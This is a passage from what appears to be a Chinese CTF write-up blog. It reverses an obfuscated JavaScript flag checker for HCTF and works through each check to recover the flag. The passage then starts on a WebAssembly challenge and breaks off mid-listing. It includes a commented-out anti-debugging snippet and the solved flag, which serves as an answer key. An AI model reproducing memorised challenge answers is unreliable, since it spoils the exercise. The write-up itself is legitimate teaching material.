class="string">&#x27;0x&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; _0x52ba71[_0x43c8d1(<span class="number">0x8</span>)]; i++) &#123;</span><br><span class="line">                char = _0x52ba71[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](i)</span><br><span class="line">                result += char[_0x43c8d1(<span class="number">0xc</span>)](<span class="number">0x10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将输入按照“_”分割</span></span><br><span class="line">        <span class="keyword">var</span> inputs = input[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> a = inputs[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>, <span class="number">0x2</span>);  <span class="comment">// 第一段的最后两个字符</span></span><br><span class="line">        <span class="keyword">var</span> b = inputs[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>);  <span class="comment">// 第一段的第五个字符，也就是“&#123;”</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// (第一段的最后两个字符 ^ &#x27;&#123;&#x27;) % 第一段长度 == 5</span></span><br><span class="line">        <span class="keyword">var</span> challenge1 = (</span><br><span class="line">                stringToHex(a) ^ stringToHex(b)</span><br><span class="line">                <span class="comment">// 第一段的长度</span></span><br><span class="line">            ) % inputs[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)] == <span class="number">0x5</span>;  <span class="comment">// 第一段长度大于5</span></span><br><span class="line">        <span class="comment">// 第一个判断条件，确定第一段的字符为hctf&#123;</span></span><br><span class="line">        <span class="comment">// if (!challenge1) &#123;</span></span><br><span class="line">            <span class="comment">// return ![];</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Base32编码</span></span><br><span class="line">        b2c = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3f9bc5</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3c3bd8 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> _0x4dc510 = [];</span><br><span class="line">            <span class="keyword">var</span> _0x4a199f = <span class="built_in">Math</span>[_0xa180(<span class="string">&#x27;0x25&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)] / <span class="number">0x5</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x4ee491 = _0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)] % <span class="number">0x5</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 != <span class="number">0x0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> _0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; <span class="number">0x5</span> - _0x4ee491; _0x1e1753++) &#123;</span><br><span class="line">                    _0x3f9bc5 += <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                _0x4a199f += <span class="number">0x1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x4a199f; _0x1e1753++) &#123;</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &gt;&gt; <span class="number">0x3</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &amp; <span class="number">0x7</span>) &lt;&lt; <span class="number">0x2</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &gt;&gt; <span class="number">0x6</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x3f</span>) &gt;&gt; <span class="number">0x1</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">0x4</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &gt;&gt; <span class="number">0x4</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">0x1</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &gt;&gt; <span class="number">0x7</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x7f</span>) &gt;&gt; <span class="number">0x2</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">0x3</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &gt;&gt; <span class="number">0x5</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &amp; <span class="number">0x1f</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> _0x545c12 = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x1</span>) _0x545c12 = <span class="number">0x6</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x2</span>) _0x545c12 = <span class="number">0x4</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x3</span>) _0x545c12 = <span class="number">0x3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x4</span>) _0x545c12 = <span class="number">0x1</span>;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[_0xa180(<span class="string">&#x27;0x2f&#x27;</span>)]();</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 启动Debugger，干扰console</span></span><br><span class="line"><span class="comment">            (function () &#123;</span></span><br><span class="line"><span class="comment">                (function _0x3c3bd8() &#123;</span></span><br><span class="line"><span class="comment">                    try &#123;</span></span><br><span class="line"><span class="comment">                        (function _0x4dc510(_0x460a91) &#123;</span></span><br><span class="line"><span class="comment">                            if ((&#x27;&#x27; + _0x460a91 / _0x460a91)[_0xa180(&#x27;0x30&#x27;)] !== 0x1 || _0x460a91 % 0x14 === 0x0) &#123;</span></span><br><span class="line"><span class="comment">                                (function () &#123;&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)());</span></span><br><span class="line"><span class="comment">                            &#125; else &#123;</span></span><br><span class="line"><span class="comment">                                debugger;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                            _0x4dc510(++_0x460a91);</span></span><br><span class="line"><span class="comment">                        &#125;(0x0));</span></span><br><span class="line"><span class="comment">                    &#125; catch (_0x30f185) &#123;</span></span><br><span class="line"><span class="comment">                        setTimeout(_0x3c3bd8, 0x1388);</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                &#125;());</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            &#125;());</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">return</span> _0x4dc510[_0xa180(<span class="string">&#x27;0x31&#x27;</span>)](<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将第三段base32编码，去除等号</span></span><br><span class="line">        a = b2c(inputs[<span class="number">0x2</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>];</span><br><span class="line">        challenge2 = stringToHex(a) ^ <span class="number">0x53a3f32</span>;  <span class="comment">// a = 0x53a3f32 ^ 0x4b7c0a73 = 0x4e463541 = &#x27;NF5A====&#x27; = &#x27;iz&#x27;</span></span><br><span class="line">        <span class="comment">// 第二个判断条件，确定第三段的字符为iz</span></span><br><span class="line">        <span class="keyword">if</span> (challenge2 != <span class="number">0x4b7c0a73</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将第四段base32编码，去除等号</span></span><br><span class="line">        a = b2c(inputs[<span class="number">0x3</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>];</span><br><span class="line">        challenge3 = stringToHex(a) ^ challenge2;  <span class="comment">// a = 0x4b7c0a73 ^ 0x4315332 = &#x27;OMYA====&#x27; = &#x27;s0&#x27;</span></span><br><span class="line">        <span class="comment">// 第三个判断条件，确定第四段的字符为s0</span></span><br><span class="line">        <span class="keyword">if</span> (challenge3 != <span class="number">0x4315332</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 0x4315332 * 0x4b7c0a73 * 第一段的长度</span></span><br><span class="line">        n = challenge3 * challenge2 * inputs[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)];</span><br><span class="line"></span><br><span class="line">        h = <span class="function"><span class="keyword">function</span> (<span class="params">seq, callback</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; seq[_0x43c8d1(<span class="number">0x8</span>)]; i++) &#123;</span><br><span class="line">                result += callback(seq[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二段以“3”进行分割</span></span><br><span class="line">        j = inputs[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="comment">// 分割后的第一段和第二段长度相等</span></span><br><span class="line">        challenge4_1 = j[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)] != j[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)];</span><br><span class="line">        <span class="comment">// 异或以后等于0x1613</span></span><br><span class="line">        challenge4_2 = (stringToHex(j[<span class="number">0x0</span>]) ^ stringToHex(j[<span class="number">0x1</span>])) != <span class="number">0x1613</span>;</span><br><span class="line">        <span class="comment">// 第四个判断条件</span></span><br><span class="line">        <span class="comment">// if (challenge4_1 || challenge4_2) &#123;</span></span><br><span class="line">        <span class="comment">//     return ![];</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// x.charCodeAt() * input[1].length</span></span><br><span class="line">        k = <span class="function"><span class="params">x</span> =&gt;</span> x[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)]() * inputs[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)];</span><br><span class="line">        <span class="comment">// 分割后的第一段每一个字符 * 第二段的长度，再加起来</span></span><br><span class="line">        challenge5 = h(j[<span class="number">0x0</span>], k);</span><br><span class="line">        <span class="comment">// 第五个判断条件</span></span><br><span class="line">        <span class="keyword">if</span> (challenge5 != <span class="number">0x2f9b5072</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 确定flag一共有五段</span></span><br><span class="line">        <span class="comment">// 第五段的前四个字符 - 0x48a05362 == n % 0x2f9b5072</span></span><br><span class="line">        m = stringToHex(inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x0</span>, <span class="number">0x4</span>)) - <span class="number">0x48a05362</span> == n % challenge5;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">repreat</span>(<span class="params">char, count</span>) </span>&#123;  <span class="comment">// char * count</span></span><br><span class="line">            <span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; count; i++) &#123;</span><br><span class="line">                result += char;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        challenge6_1 = !m;</span><br><span class="line">        <span class="comment">// 第五段第六个字符 * 2 ！= 第五段最后四个字符（除去了“&#125;”）</span></span><br><span class="line">        challenge6_2 = repreat(inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x5</span>, <span class="number">0x1</span>), <span class="number">0x2</span>) == inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x5</span>, <span class="number">0x4</span>);</span><br><span class="line">        <span class="comment">// 第五段的最后一个字符（除去了“&#125;”） - 第五段第五个字符 == 1</span></span><br><span class="line">        challenge6_3 = inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>, <span class="number">0x1</span>) - inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) != <span class="number">0x1</span>;</span><br><span class="line">        <span class="comment">// 第六个判断条件</span></span><br><span class="line">        <span class="keyword">if</span> (challenge6_1 || challenge6_2 || challenge6_3) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        a = inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>)</span><br><span class="line">        b = inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x1</span>)</span><br><span class="line">        c = inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0x8</span>)]</span><br><span class="line">        <span class="comment">// 第五段第七第八个字符的hex == 第五段第七个字符 * 第五段的长度 * 5</span></span><br><span class="line">        o = stringToHex(a)[_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x2</span>) == b[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)]() * c * <span class="number">0x5</span>;</span><br><span class="line">        challenge7_1 = o;</span><br><span class="line">        <span class="comment">// 第五段第五个字符 == &#x27;2&#x27;</span></span><br><span class="line">        <span class="comment">// 根据challenge6_3得出第五段最后一个字符为3</span></span><br><span class="line">        challenge7_2 = inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) == <span class="number">0x2</span>;</span><br><span class="line">        <span class="comment">// 第五段第七第八个字符 == 第五段第八个字符 * 2</span></span><br><span class="line">        challenge7_3 = a == repreat(inputs[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x7</span>, <span class="number">0x1</span>), <span class="number">0x2</span>);</span><br><span class="line">        <span class="comment">// 最终的判断条件</span></span><br><span class="line">        <span class="keyword">return</span> challenge7_1 &amp;&amp; challenge7_2 &amp;&amp; challenge7_3;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        <span class="built_in">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;gg&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// var input = document[_0xa180(&#x27;0x32&#x27;)](_0xa180(&#x27;0x33&#x27;))[&#x27;value&#x27;];</span></span><br><span class="line">    <span class="comment">// 修改为从query获取GET参数方便调试</span></span><br><span class="line">    input = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> r = <span class="built_in">window</span>.location.search.substr(<span class="number">1</span>).match(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;(^|&amp;)&quot;</span> + name + <span class="string">&quot;=([^&amp;]*)(&amp;|$)&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(r != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">decodeURI</span>(r[<span class="number">2</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;(<span class="string">&#x27;input&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>[_0xa180(<span class="string">&#x27;0x34&#x27;</span>)](_0xa180(<span class="string">&#x27;0x35&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> result = check(input);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        alert(_0xa180(<span class="string">&#x27;0x36&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(_0xa180(<span class="string">&#x27;0x37&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>[<span class="string">&#x27;onload&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// window.console.clear();window.console.log(&#x27;Welcome to HCTF :&gt;&#x27;)</span></span><br><span class="line">    <span class="comment">//setInterval(_0xa180(&#x27;0x38&#x27;), 0x32); // 干扰console</span></span><br><span class="line">    test();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>主要的判断逻辑在check函数里，首先看到最后的<code>inputs[0x4]</code>可以确定输入一共有五段，以下划线“_”分割，并且已知以“hctf{”开头，以“}”结尾。<br>推测<code>hctf&#123;xxxx_xxxx_xxxx_xxxx_xxxx&#125;</code></p><p>在challenge1处需要的条件是</p><ol><li>(第一段的最后两个字符的hex ^ ‘{‘的hex) % 第一段长度 == 5</li></ol><p>可知第一段长度为7</p><p>在challenge2处需要的条件是</p><ol><li>第三段的base32除去等号的hex ^ 0x53a3f32 == 0x4b7c0a73</li></ol><p>由此可以计算出第三段的base32除去等号的hex为0x4e463541，转为base32为NF5A====，解码为iz<br>推测<code>hctf&#123;xx_xxxx_iz_xxxx_xxxx&#125;</code></p><p>在challenge3处需要的条件是</p><ol><li>第四段的base32除去等号的hex ^ 0x4b7c0a73 == 0x4315332</li></ol><p>由此可以计算出第四段的base32除去等号的hex为0x4f4d5941，转为base32为OMYA====，解码为s0<br>推测<code>hctf&#123;xx_xxxx_iz_s0_xxxx&#125;</code></p><p>在challenge4处需要的条件是</p><ol><li>第二段中必须包含一个’3’</li><li>第二段以’3’分割，前后的长度相等</li><li>前后hex异或得到的结果是0x1613，</li></ol><p>由此得出第二段中间为3<br>推测<code>hctf&#123;xx_xx3xx_iz_s0_xxxx&#125;</code></p><p>在challenge5处需要的条件是</p><ol><li>第二段分割以后的第一段，即’3’之前的每一个字符 * 第二段的长度，再加起来 == 0x2f9b5072</li></ol><p>假设第二段长度为5，则0x2f9b5072/5除不尽，那么第二段长度为7，得出第二段第一部分的和为114108118，转为字符串为rev<br>再根据challenge4.3得出第二段后面的字符串hex为0x726576 ^ 0x1613=0x727365，转为字符串为rse<br>推测<code>hctf&#123;xx_rev3rse_iz_s0_xxxx&#125;</code></p><p>在challenge6处需要的条件是</p><ol><li>第五段的前四个字符hex - 0x48a05362 == (0x4315332 * 0x4b7c0a73 * 第一段的长度) % 0x2f9b5072</li><li>第五段第六个字符 + 第五段第六个字符 ！= 第五段除去’}’外最后五个字符，即xxxx}中的xxxx</li><li>第五段的倒数第二个字符 - 第五段第五个字符 == 1</li></ol><p>根据challenge1的结论以及challenge6.1可以算出第五段前四个字符的hex为0x68347246，转为字符串为h4rd<br>推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rdxxxx&#125;</code></p><p>在challenge7处需要的条件是</p><ol><li>第五段第七和第八个字符的hex数字 == 第五段第七个字符 * 第五段的长度 * 5</li><li>第五段第五个字符 == ‘2’</li><li>第五段第七第八个字符 == 第五段第八个字符 + 第五段第吧个字符，即第五段第七和第八个字符相同</li></ol><p>根据challenge7.2可知<br>推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd2xxxxxxx&#125;</code></p><p>根据challenge6.3可知<br>推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd2xxxxxx3&#125;</code></p><p>根据附加条件1<br><code>flag.substr(-5,3)==&quot;333&quot;</code></p><p>推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd2xxx3333&#125;</code></p><p>根据附加条件2<br><code>flag.substr(-8,1)==&quot;3&quot;</code></p><p>可知第五段长度为8+5=13，并且第六个字符为’3’<br>推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd23xx3333&#125;</code></p><p>根据challenge7.1可以计算出第五段第七第八个字符的hex为0x6565，转为字符串为ee<br>推测<code>hctf&#123;xx_rev3rse_iz_s0_h4rd23ee3333&#125;</code></p><p>根据challenge1以及附加条件4<br><code>sha256(flag) == &quot;d3f154b641251e319855a73b010309a168a12927f3873c97d2e5163ea5cbb443&quot;</code></p><p>最终爆破出第一段最后两个字符为j5<br>得到flag为<br><code>hctf&#123;j5_rev3rse_iz_s0_h4rd23ee3333&#125;</code></p><hr><h1 id="Baby-Reverse-200"><a href="#Baby-Reverse-200" class="headerlink" title="Baby Reverse(200)"></a>Baby Reverse(200)</h1><p>打开网页源码在JavaScript里对输入的字符串进行了处理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btnCheck = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;btnCheck&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> tbxFlag = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> txtStatus = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;status&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// var _debug_asm;</span></span><br><span class="line"><span class="comment">// var _debug_mem;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_c_string</span>(<span class="params">buf, index, s</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">        buf[index + i] = s.charCodeAt(i);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[index + i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&#x27;flag.wasm&#x27;</span>)</span><br><span class="line">.then(<span class="function"><span class="params">response</span> =&gt;</span> response.arrayBuffer())</span><br><span class="line">.then(WebAssembly.instantiate)</span><br><span class="line">.then(<span class="function"><span class="params">mod</span> =&gt;</span> mod.instance)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span>(<span class="params">asm</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mem = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(asm.exports.memory.buffer);</span><br><span class="line">    <span class="comment">// _debug_mem = mem;</span></span><br><span class="line">    <span class="comment">// _debug_asm = asm;</span></span><br><span class="line"></span><br><span class="line">    btnCheck.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> flag = tbxFlag.value;</span><br><span class="line">        <span class="comment">// console.log(flag);</span></span><br><span class="line">        <span class="keyword">var</span> buf_addr = asm.exports.get_buf();</span><br><span class="line">        set_c_string(mem, buf_addr, flag);</span><br><span class="line">        <span class="keyword">if</span>(asm.exports.check_flag(buf_addr))&#123;</span><br><span class="line">            txtStatus.innerText = (<span class="keyword">new</span> <span class="built_in">Date</span>()).toLocaleString() + <span class="string">&#x27; * - * - * Correct flag! * - * - *&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            txtStatus.innerText = (<span class="keyword">new</span> <span class="built_in">Date</span>()).toLocaleString() + <span class="string">&#x27; Wrong flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;ready&#x27;</span>); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以看到最后交给了flag.wasm处理，wasm是WebASsembly的二进制格式文件，下载flag.wasm使用wabt进行逆向。首先将二进制格式的flag.wasm转换为文本格式wat，懒得下载的可以使用<a href="https://webassembly.github.io/wabt/demo/wasm2wat/">在线工具</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 